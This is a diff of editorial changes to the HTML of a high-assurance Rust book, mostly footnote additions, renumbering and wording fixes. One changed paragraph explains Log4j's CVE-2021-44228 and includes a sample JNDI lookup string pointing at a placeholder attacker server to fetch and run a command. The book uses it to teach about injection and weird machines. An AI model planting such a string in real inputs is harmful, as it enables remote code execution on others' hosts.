@@ -8761,6 +8761,7 @@ Every format contains sections storing:</p>
 Meaning the OS has scheduled the process to receive CPU time, the executable bytes will churn through our aforementioned fetch/decode/execute cycle.</p>
 <p>An OS's loader takes the contents of an on-disk executable, places them into memory, and prepares that memory for program execution.
 A linker may also be involved to combine various pieces of code and data, potentially from several executables, either at compilation or load time.
+Recall our <a href="https://highassurance.rs/chp2/operational_assurance_2.html#building-a-free-standing-binary">discussion of static vs dynamic linking</a> from Chapter 2.
 Either way, the end result of the loading looks roughly like so:</p>
 </br>
 <p align="center">
@@ -10015,7 +10016,7 @@ In fact, Java's Log4J CVE-2021-44228<sup class="footnote-reference"><a href="#Lo
 <p>Many log sites in a codebase write external, attacker-controlled values directly into the logged string. A host's User Agent is one example, since it can be configured. Coupled with expansion/meta-programming, we lose a <strong>non-repudiation</strong> property - the attacker controls log message contents and can falsify data to cover their tracks.</p>
 </li>
 <li>
-<p>It gets worse: we also lose all assurance as well. As of 2013, Log4j offers integration with the Java Naming and Directory Interface (JNDI). This functionality, intended for remote lookups, allows fetching and running Java classes from a remote server. If an attacker can get a string like <code>${jndi:ldap://evildomain.net:1337/Basic/Command/Base64/SOME_BASE64_CMD}</code> into a log, the victim's host will connect to an attacker-controlled server, fetch an arbitrary malicious command, and execute it locally.</p>
+<p>It gets worse: we also lose all assurance as well. As of 2013, Log4j offers integration with the Java Naming and Directory Interface (JNDI). This functionality, intended for remote lookups, allows fetching and running Java classes from a remote server. If an attacker can get a string like <code>${jndi:ldap://evildomain.net:1337/Basic/Command/Base64/SOME_BASE64_CMD}</code> into a log<sup class="footnote-reference"><a href="#HutchinsLog4J">16</a></sup>, the victim's host will connect to an attacker-controlled server, fetch an arbitrary malicious command, and execute it locally.</p>
 </li>
 </ul>
 <p>In this example of command injection, the weird machine is programmed with a specially crafted string addressing an attacker-controlled server.
@@ -10033,7 +10034,7 @@ Those building blocks constitute a &quot;weird machine&quot;.
 When attackers write working exploits, they're, in essence, developing a new application for this inner machine.</p>
 <p>In the abstract game that is computer security, an attacker wins if they can successfully leverage any weird machine they discover.
 In practice, a defender cannot eliminate weird machines entirely.
-From an computability perspective, turing-completeness<sup class="footnote-reference"><a href="#TuringComplete">16</a></sup> gives the attacker a significant advantage.</p>
+From an computability perspective, turing-completeness<sup class="footnote-reference"><a href="#TuringComplete">17</a></sup> gives the attacker a significant advantage.</p>
 <p>Defenders strive to reduce and/or detect possible transitions out of the normal states and into the weird ones.
 Strongly-enforced memory and type-safety eliminate <em>a great deal</em> of possible transitions to malicious states.</p>
 <p>With that high-level conceptualization in mind, let's learn our way around a debugger and start dabbling in weird machine development ourselves.</p>
@@ -10080,7 +10081,7 @@ In the next section, we'll put these concepts into play hands-on to reduce secre
 <div class="footnote-definition" id="FormalWeirdness"><sup class="footnote-definition-label">13</sup>
 <p><a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=8226852"><em>Weird Machines, Exploitability, and Provable Unexploitability</em></a>. Thomas Dullien (2017).</p>
 </div>
-<div class="footnote-definition" id="TuringComplete"><sup class="footnote-definition-label">16</sup>
+<div class="footnote-definition" id="TuringComplete"><sup class="footnote-definition-label">17</sup>
 <p><a href="https://en.wikipedia.org/wiki/Turing_completeness"><em>Turing Completeness</em></a>. Wikipedia (Accessed 2022).</p>
 </div>
 <div class="footnote-definition" id="Log4J"><sup class="footnote-definition-label">14</sup>
@@ -10088,6 +10089,9 @@ In the next section, we'll put these concepts into play hands-on to reduce secre
 </div>
 <div class="footnote-definition" id="ComputerphileLog4J"><sup class="footnote-definition-label">15</sup>
 <p><a href="https://www.youtube.com/watch?v=Opqgwn8TdlM"><em>Log4J &amp; JNDI Exploit: Why So Bad?</em></a>. Computerphile (2021).</p>
+</div>
+<div class="footnote-definition" id="HutchinsLog4J"><sup class="footnote-definition-label">16</sup>
+<p><a href="https://www.youtube.com/watch?v=0-abhd-CLwQ"><em>Log4j (CVE-2021-44228) RCE Vulnerability Explained</em></a>. Marcus Hutchins (2021).</p>
 </div>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="rusts-memory-safety-guarantees"><a class="header" href="#rusts-memory-safety-guarantees">Rust's Memory Safety Guarantees</a></h1>
 <blockquote>
@@ -11107,7 +11111,7 @@ And this hardware's characteristics can have a <em>significant</em> impact on th
 So we need to ground our discussion of memory in its physical reality: the performance hierarchy of contemporary storage technologies.</p>
 <blockquote>
 <p><strong>Credit where credit is due</strong></p>
-<p>The contents of this chapter are heavily influenced by &quot;Computer Systems: A Programmer's Perspective&quot;<sup class="footnote-reference"><a href="#CSAPP">2</a></sup>.</p>
+<p>The contents of this chapter are heavily influenced by <a href="https://amzn.to/3IBnFA7"><em>Computer Systems: A Programmer's Perspective</em></a><sup class="footnote-reference"><a href="#CSAPP">2</a></sup>.</p>
 <p>The book's authors, professors at Carnegie Mellon University, use it to teach an undergraduate CS course. The course number is 15-213, affectionately called &quot;the course that gives CMU its zip&quot; because 15213 is the ZIP code in which the university is located and because the course is so foundational in the university's core CS curriculum.</p>
 <p>CS:APP is a well-regarded text and a detailed introduction to both computer architecture and operating systems.
 Highly recommend it.</p>
@@ -11259,7 +11263,8 @@ We saw this when exploring stack safety and MISRA C 17.2<sup class="footnote-ref
 <p>What impact does recursion have on the more general case, arbitrary static analysis and/or verification tooling?</p>
 <p>Technically, it depends.
 Realistically, many useful tools need to build a static <strong>Inter-procedural Control Flow Graph (ICFG)</strong>.
-Because it's a &quot;backbone&quot; common analysis algorithms run on.</p>
+Because it's a &quot;backbone&quot; common analysis algorithms run on.
+And because understanding all possible call sequences often enables judgments about all possible executions.</p>
 <p>We're going to consider 3 ICFGs of increasing complexity.
 First, our MISRA C 17.2-compatible, iterative program from Chapter 4.2:</p>
 </br>
@@ -11273,7 +11278,7 @@ First, our MISRA C 17.2-compatible, iterative program from Chapter 4.2:</p>
 <li>
 <p>This is a <strong>Directed Acyclic Graph (DAG)</strong>. For analysis authors, this graph enables certain algorithms or possibilities.</p>
 <ul>
-<li>Example: topological sort, which can be used to represent a valid sequence of tasks, requires a DAG.</li>
+<li>Example: topological sort<sup class="footnote-reference"><a href="#TopSort">2</a></sup>, which can be used to represent a valid sequence of tasks, requires a DAG.</li>
 </ul>
 </li>
 </ul>
@@ -11294,7 +11299,7 @@ First, our MISRA C 17.2-compatible, iterative program from Chapter 4.2:</p>
 </li>
 </ul>
 <p>There's also mutual recursion, where two or more functions call each other.
-Let's just think of this as even less desirable variation of the prior recursive version:</p>
+Let's just consider it an even less desirable variation of the prior recursive version:</p>
 </br>
 <p align="center">
   <img width="50%" src="chp16_appendix/icfg_mut_rec.svg">
@@ -11302,7 +11307,7 @@ Let's just think of this as even less desirable variation of the prior recursive
   <figcaption><center>Mutually recursive program ICFG - a Directed Graph (DG) variation.</center></figcaption><br>
   </figure>
 </p>
-<p>A DAG vs DG comparison is intentionally vague, we can't really make any claims about static analyzers as a whole - there's probably exist thousands of static analyzers serving hundreds of use cases.
+<p>A DAG vs DG comparison is intentionally vague, we can't really make any claims about static analyzers as a whole - there probably exist thousands of static analyzers serving hundreds of use cases.
 But it helps build an intuition.
 Imagine writing logic to traverse these graphs - a DAG avoids edge cases.</p>
 <h2 id="takeaway-23"><a class="header" href="#takeaway-23">Takeaway</a></h2>
@@ -11311,6 +11316,9 @@ It impacts a program's Inter-procedural Control Flow Graph (ICFG), generally hin
 <hr />
 <div class="footnote-definition" id="MISRA_2012"><sup class="footnote-definition-label">1</sup>
 <p><em>MISRA C: 2012 Guidelines for the use of the C language in critical systems (3rd edition)</em>. MISRA (2019).</p>
+</div>
+<div class="footnote-definition" id="TopSort"><sup class="footnote-definition-label">2</sup>
+<p><a href="https://en.wikipedia.org/wiki/Topological_sorting"><em>Topological sorting</em></a>. Wikipedia (Accessed 2023).</p>
 </div>
 
                     </main>
